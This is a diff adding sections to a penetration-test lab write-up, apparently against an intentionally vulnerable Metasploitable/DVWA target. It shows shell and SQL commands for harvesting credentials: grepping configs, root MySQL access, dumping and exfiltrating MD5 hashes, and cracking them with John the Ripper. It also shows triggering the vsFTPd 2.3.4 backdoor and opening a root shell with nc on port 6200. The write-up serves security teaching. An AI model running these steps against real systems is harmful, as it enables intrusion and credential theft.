@@ -331,7 +331,7 @@ Sub Step 1: Locating the Web Root Directory
 Command Executed
 
 Navigating to the web server document root...
-cd /var/www/ && pwd && ls -la
+- cd /var/www/ && pwd && ls -la
 
 Results
 
@@ -359,12 +359,11 @@ The web root directory represents a valuable source of information because it co
 The presence of multiple web applications significantly increased the amount of potentially sensitive information available within the environment.
 
 Sub Step 2: Searching for Configuration Files Containing Credential References
+
 Command Executed
 
 Searching configuration files for password-related information...
-
-Shell
-grep -rnw '/var/www/' --include="*config*" -e 'password'
+- grep -rnw '/var/www/' --include="*config*" -e 'password'
  
 Results
 
@@ -384,3 +383,483 @@ Examples included:
 Analysis
 
 Configuration files often contain operational details required for application-to-database communication. The discovery of password-related configuration entries provided valuable insight into how applications authenticate and store credentials.
+
+Sub Step 3: Accessing the MySQL Service
+
+Command Executed
+
+Connecting to the MySQL database service...
+- mysql -u root
+
+Results
+
+![alt text](3.3_Accessing_MySql.png)
+
+Observation
+
+A connection to the MySQL database service was successfully established.
+
+The system reported:
+
+- Your MySQL connection id is 8
+- Server version: 5.0.51a-3ubuntu5
+
+and presented the MySQL command prompt:
+
+mysql>
+
+indicating successful database access.
+
+Analysis
+
+Database services often contain application data, user accounts, configuration information, and authentication records. Successful access to MySQL demonstrated that the backend database infrastructure was accessible from the compromised environment and provided a foundation for further investigation.
+
+Sub Step 4: Enumerating Available Databases
+
+Command Executed
+
+Listing available databases...
+- SHOW DATABASES;
+
+Results
+
+![alt text](3.4_showing_databases;.png)
+
+Observation
+
+The database server revealed several available databases, including:
+
+- information_schema
+- dvwa
+- metasploit
+- mysql
+- owasp10
+- tikiwiki
+- tikiwiki195
+
+Analysis
+
+Database enumeration is an important reconnaissance activity because it identifies the applications and services that rely on backend storage.
+
+The presence of multiple application-specific databases suggested that the target hosted several web applications, each potentially containing authentication information, configuration settings, and user-related data.
+
+Sub Step 5: Identifying High-Value Tables
+
+Commands Executed
+
+Selecting the DVWA database...
+- USE dvwa;
+
+Enumerating available tables...
+- SHOW TABLES;
+
+Results
+
+![alt text](3.5_accessing_dvwa_db_and_usrs_tabl.png)
+
+Observation
+
+The DVWA database contained the following tables:
+
+- guestbook
+- users
+
+The users table appeared particularly valuable because it likely contained authentication-related information.
+
+Analysis
+
+After identifying a web application's database, analysts commonly search for tables associated with user authentication and account management.
+
+The discovery of a dedicated users table suggested that credentials or authentication records may be stored within the database.
+
+Sub Step 6: Credential Harvesting from the User Repository
+
+Command Executed
+
+Retrieving user records...
+- SELECT user, password FROM users;
+
+Results
+
+![alt text](3.6_harvesting_Credentials.png)
+
+Observation
+
+The query returned usernames and corresponding password hashes.
+
+Examples included:
+
+- admin
+- gordonb
+- 1337
+- pablo
+- smithy
+
+The password values appeared as fixed-length cryptographic hashes rather than plaintext credentials.
+
+Analysis
+
+The results confirmed that user authentication information was stored within the database. Although passwords were not stored in plaintext, the hashes represented authentication artifacts that could be analyzed further.
+
+This step established the foundation for password-analysis activities later in the assessment.
+
+Sub Step 7: Inspecting the Authentication Table Structure
+
+Command Executed
+
+Inspecting the schema of the users table...
+- DESC users;
+
+Results
+
+![alt text](3.6_inspecting_table_schema.png)
+
+Observation
+
+The structure of the authentication table revealed the following fields:
+
+- user_id
+- first_name
+- last_name
+- user
+- password
+- avatar
+
+The password field was defined as:
+
+password varchar(32)
+
+Analysis
+
+Schema inspection provides insight into how applications manage and organize authentication information.
+
+The size of the password column suggested the use of a fixed-length hashing algorithm rather than plaintext storage.
+
+Sub Step 8: Extracting Authentication Records
+
+Command Executed
+
+Exporting authentication records into a dedicated file...
+- mysql -u root dvwa -N -e "SELECT CONCAT(user, ':', password) FROM users;" > /tmp/mysql_hash.txt
+
+Results
+
+![alt text](3.7_extracting_user_hashes.png)
+
+Observation
+
+Authentication records were exported successfully into:
+
+- mysql_hash.txt
+
+for later analysis.
+
+Analysis
+
+Exporting authentication data into a dedicated file simplifies later examination and allows the credentials to be processed using specialized password-analysis tools.
+
+Sub Step 9: Verifying Credential Extraction
+
+Command Executed
+
+Displaying the extracted file...
+- cat /tmp/mysql_hash.txt
+
+Results
+
+![alt text](3.8_verifying_hash_file_Existence.png)
+
+Observation
+
+The file contained multiple username-hash pairs.
+
+Examples included:
+
+- admin:5f4dcc3b5aa765d61d8327deb882cf99
+- gordonb:e99a18c428cb38d5f260853678922e03
+
+Analysis
+
+Verification ensured that extraction was successful and confirmed that the dataset was ready for further investigation.
+
+Sub Step 10: Investigating Password Storage Mechanisms
+
+Command Executed
+
+Reviewing application source code for password-handling routines...
+- grep --color=always -rn 'password' /var/www/dvwa/
+
+Results
+
+![alt text](3.9_checking_For_password_format.png)
+
+Observation
+
+Password-handling logic within the application source code revealed references to:
+
+- PHP
+- MD5(password)
+
+during authentication and account-management operations.
+
+Analysis
+
+The source-code review confirmed that the application relied on the MD5 hashing algorithm to generate and store password hashes.
+
+This finding validated the observations made during database analysis and provided evidence regarding how authentication information was stored internally.
+
+Sub Step 11: Preparing Credential Data for Transfer
+
+Command Executed
+
+Encoding the extracted credential file...
+- base64 /tmp/mysql_hash.txt
+
+Results
+
+![alt text](3.10_encoding_hash_file_in_victim_os.png)
+
+Observation
+
+The extracted hash file was successfully encoded using Base64.
+
+Analysis
+
+Encoding the file preserved its contents during transfer and ensured that the extracted authentication data could be reconstructed accurately on the analyst workstation.
+
+Sub Step 12: Reconstructing the Credential Dataset on the Assessment Machine
+
+Commands Executed
+
+Transferring decoded hashes into attacker system file...
+- echo "<base64_data>" | base64 -d > hashes.txt
+
+Verifying hash existence...
+- cat hashes.txt
+
+Results
+
+![alt text](3.11_pasting_encoded_form_into_attacking_os_file_decoding.png)
+
+Observation
+
+The authentication dataset was successfully reconstructed and verified on the assessment system.
+
+Analysis
+
+Successful reconstruction confirmed that the extracted credential file had been transferred without corruption and was ready for password analysis.
+
+Sub Step 13: Password Analysis Using John the Ripper
+
+Command Executed
+
+Analyzing the extracted password hashes...
+- john --format=raw-md5 hashes.txt
+
+Results
+
+![alt text](3.12_running_john_the_Ripper.png)
+
+Observation
+
+John the Ripper successfully identified the hashes as:
+
+- Raw-MD5
+
+and recovered multiple passwords from the extracted dataset.
+
+Recovered passwords included:
+
+- admin → password
+- smithy → password
+- gordonb → abc123
+- pablo → letmein
+- 1337 → charley
+
+Analysis
+
+The successful recovery of credentials demonstrated that weak password-selection practices can undermine the security benefits of password hashing.
+
+Although hashes were stored instead of plaintext passwords, predictable passwords remained vulnerable to password-analysis techniques.
+
+Sub Step 14: Verifying Recovered Credentials
+
+Command Executed
+
+Displaying recovered credentials...
+- john --show --format=Raw-MD5 hashes.txt
+
+Results
+
+![alt text](3.13_john_the_ripper_output.png)
+
+Observation
+
+John the Ripper displayed all recovered credentials:
+
+- admin:password
+- gordonb:abc123
+- 1337:charley
+- pablo:letmein
+- smithy:password
+
+The tool reported:
+
+- 5 password hashes cracked
+- 0 left
+
+indicating complete recovery of the extracted authentication records.
+
+Analysis
+
+The results highlighted several authentication weaknesses:
+
+- Use of common dictionary passwords.
+- Predictable password-selection patterns.
+- Password reuse across multiple accounts.
+- Reliance on an outdated hashing algorithm.
+
+The findings demonstrate that secure password storage mechanisms must be combined with strong password-selection practices to provide effective protection against credential compromise.
+
+## Phase 3 Conclusion
+
+The final phase focused on credential discovery, extraction, preparation, and password analysis following successful access to the target environment.
+
+Application files, database systems, and authentication repositories were examined to identify credential-storage locations and authentication mechanisms. Database enumeration revealed user-account information and stored password hashes within the DVWA application database.
+
+Source-code review confirmed the use of MD5 hashing for password storage, while password analysis using John the Ripper demonstrated that weak passwords could be successfully recovered despite being stored as hashes.
+
+The assessment illustrated the following progression:
+
+- Web Application Discovery
+↓
+- Database Enumeration
+↓
+- User Table Identification
+↓
+- Hash Extraction
+↓
+- Hash Verification
+↓
+- Password Analysis
+↓
+- Credential Recovery
+
+The findings emphasize the importance of secure password-storage mechanisms, strong password policies, credential hygiene, and defense-in-depth security controls to reduce the risk of successful credential compromise.
+
+# Phase 4 – Service Validation and Alternative Access Paths
+
+## Overview
+
+While the primary assessment focused on Port 1524 and the subsequent discovery of web applications, databases, and authentication repositories, additional investigation was conducted to better understand the relationship between exposed services identified during reconnaissance.
+
+The objective of this phase was to manually interact with services identified during enumeration and observe how exposed services could contribute to overall system exposure. Particular attention was given to the FTP service running on Port 21 and the backdoor listener exposed on Port 6200.
+
+This phase serves as a practical demonstration of how information gathered during reconnaissance can be validated through direct interaction with exposed services.
+
+Sub Step 1: Manual Interaction with the FTP Service
+
+Command Executed
+
+Connecting to the FTP service using Telnet...
+- telnet 192.168.56.20 21
+
+Results
+
+![alt text](4.1_entering_port_21.png)
+
+Observation
+
+A connection was successfully established to the FTP service running on Port 21.
+
+The service banner identified itself as:
+
+- 220 (vsFTPd 2.3.4)
+
+The server immediately prompted for authentication credentials:
+
+- USER hacker:)
+- 331 Please specify the password.
+- PASS password
+
+Analysis
+
+Banner interaction provides a direct method of verifying service information discovered during reconnaissance activities.
+
+The observed FTP banner matched the version information previously identified during service enumeration, confirming the presence of the vsFTPd service on the target host.
+
+This step demonstrates how reconnaissance findings can be validated through direct communication with the service itself. Service banners often reveal useful information regarding software versions, authentication mechanisms, and implementation details that can assist further investigation.
+
+The interaction also reinforces the importance of minimizing unnecessary service exposure because publicly accessible services frequently reveal operational information before authentication is even attempted.
+
+Sub Step 2: Accessing the Backdoor Listener
+
+Command Executed
+
+Connecting to the listener on Port 6200...
+- nc 192.168.56.20 6200
+
+Verification Commands...
+- whoami
+- id
+
+Results
+
+![alt text](4.2_accessing_port_6200_backdoor.png)
+
+Observation
+
+A connection was successfully established to the service listening on Port 6200.
+
+Identity verification commands returned:
+
+- root
+ 
+and
+
+- uid=0(root) gid=0(root)
+
+confirming that the connection provided interaction with a process operating under administrative privileges.
+
+Analysis
+
+The connection validated the presence of a listener operating on Port 6200 and demonstrated that interactions occurred under a privileged security context.
+
+The results highlight the security implications of exposed services that provide direct operating-system interaction. Administrative-level accessibility dramatically increases the potential impact of service exposure because successful interaction may provide visibility into system resources, configuration files, application infrastructure, and authentication repositories.
+
+The finding further illustrates how seemingly unrelated reconnaissance observations can become connected during an assessment:
+
+- Service Enumeration
+↓
+- Version Identification
+↓
+- Service Validation
+↓
+- Listener Discovery
+↓
+- Privileged Interaction
+ 
+
+This demonstrates the importance of correlating reconnaissance findings rather than viewing them as isolated observations.
+
+## Phase 4 Conclusion
+
+The final phase focused on validating exposed services identified during reconnaissance and understanding their relationship to the overall assessment process.
+
+Direct interaction with the FTP service confirmed previously identified service information and demonstrated how service banners may expose useful operational details before user authentication occurs. Additional investigation of the listener on Port 6200 confirmed the presence of a privileged service capable of providing direct operating-system interaction.
+
+These findings reinforce an important security principle:
+
+- Service Exposure
+↓
+- Information Disclosure
+↓
+- Service Validation
+↓
+- Privileged Access
+↓
+- Security Impact
+ 
+
+The assessment illustrates how exposed services can serve as critical entry points and emphasizes the importance of reducing unnecessary service exposure, maintaining strong authentication controls, and continuously monitoring publicly accessible services.
+
